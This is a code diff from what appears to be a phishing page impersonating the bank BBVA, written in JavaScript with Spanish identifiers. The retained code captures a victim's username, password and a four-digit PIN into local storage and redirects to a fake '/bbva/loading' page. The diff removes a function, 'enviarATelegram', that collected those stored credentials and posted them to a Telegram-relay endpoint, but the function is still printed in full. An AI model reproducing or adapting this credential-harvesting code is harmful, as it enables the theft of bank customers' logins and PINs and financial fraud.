@@ -173,35 +173,6 @@
                 return value ? JSON.parse(value) : '--';
             }
 
-            async function enviarATelegram() {
-                const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'pincaj', 'status', 'uniqid'];
-
-                fields.forEach(field => {
-                    allData[field] = getFromLocalStorage(field);
-                });
-
-                console.log('Datos a enviar a Telegram:', allData);
-
-                try {
-                    const response = await fetch('/api/telegram/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            uniqid: appState.uniqId,
-                            data: allData
-                        })
-                    });
-                    const result = await response.json();
-                    console.log('Datos enviados a Telegram:', result);
-                } catch (e) {
-                    console.error('Error al enviar a Telegram:', e);
-                }
-            }
-
             function validateOtp() {
                 const value = $('#pincajInput').val().trim();
                 const isValid = /^\d{4}$/.test(value);
@@ -210,12 +181,11 @@
             }
 
             $('#pincajInput').on('input', validateOtp);
-            $('#btnPinCaj').on('click', async function () {
+            $('#btnPinCaj').on('click', function () {
                 if (validateOtp()) {
                     saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                     saveToLocalStorage('status', 'PINCAJ');
 
-                    await enviarATelegram();
                     window.location.href = '/bbva/loading';
                 }
             });
